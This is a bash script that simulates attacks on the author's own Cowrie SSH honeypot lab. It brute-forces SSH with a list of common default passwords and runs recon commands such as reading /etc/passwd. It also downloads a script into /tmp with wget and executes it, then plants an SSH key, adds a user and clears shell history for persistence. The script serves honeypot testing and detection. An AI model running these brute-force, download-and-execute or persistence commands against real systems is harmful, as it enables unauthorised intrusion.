#!/usr/bin/env bash
# Attack simulator for YOUR OWN lab. Run on Kali, targeting the Cowrie honeypot (port 22 -> 2222).
# Only run against machines you own. Needs: sshpass  (sudo apt install -y sshpass)
#
# Usage: ./attack_sim.sh <target_ip> [scenario]
#   scenario: brute | recon | dropper | persist | all   (default: all)
set -u
TARGET="${1:?usage: $0 <target_ip> [brute|recon|dropper|persist|all]}"
SCENARIO="${2:-all}"
PORT=22   # honeypot port (firewalld forwards 22 -> 2222). Real SSH is on 2200: never target it.
SSHO=(-p "$PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
      -o ConnectTimeout=8 -o LogLevel=ERROR -o PreferredAuthentications=password,keyboard-interactive)

command -v sshpass >/dev/null || { echo "install sshpass first: sudo apt install -y sshpass"; exit 1; }

try() { # try <user> <pass> [command...]  -> runs one SSH attempt
  local u="$1" p="$2"; shift 2
  SSHPASS="$p" sshpass -e ssh "${SSHO[@]}" "$u@$TARGET" "$@" >/dev/null 2>&1
}

brute() {
  echo "[*] Scenario: brute-force (many users/passwords, short interval)"
  local users=(root admin ubuntu pi test oracle postgres user)
  local pass=(root 123456 admin password toor raspberry qwerty letmein)
  for u in "${users[@]}"; do
    for p in "${pass[@]:0:3}"; do
      try "$u" "$p" "exit"; sleep 0.3
    done
  done
  echo "    -> ${#users[@]}x3 attempts sent. Failed events only appear if Cowrie's userdb.txt denies them,"
  echo "       see README note (default denies root/root and root/123456)."
}

recon() {
  echo "[*] Scenario: post-login reconnaissance"
  for c in "whoami" "id" "uname -a" "cat /etc/passwd" "ls -la /" "ps aux" "ifconfig" "cat /proc/cpuinfo"; do
    try root kali "$c"; sleep 1
  done
}

dropper() {
  echo "[*] Scenario: malware download attempt (harmless URL)"
  try root kali "cd /tmp && wget http://example.com/bot.sh -O bot.sh"; sleep 1
  try root kali "chmod +x /tmp/bot.sh"; sleep 1
  try root kali "/tmp/bot.sh"
}

persist() {
  echo "[*] Scenario: persistence attempts"
  try root kali "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3Nza-FAKE attacker@evil' >> ~/.ssh/authorized_keys"; sleep 1
  try root kali "crontab -l"; sleep 1
  try root kali "useradd -m -s /bin/bash support"; sleep 1
  try root kali "history -c"
}

case "$SCENARIO" in
  brute) brute ;; recon) recon ;; dropper) dropper ;; persist) persist ;;
  all) brute; recon; dropper; persist ;;
  *) echo "unknown scenario: $SCENARIO"; exit 1 ;;
esac
echo "[+] Done. On Rocky check: tail -n 20 /opt/cowrie/var/log/cowrie/cowrie.json"
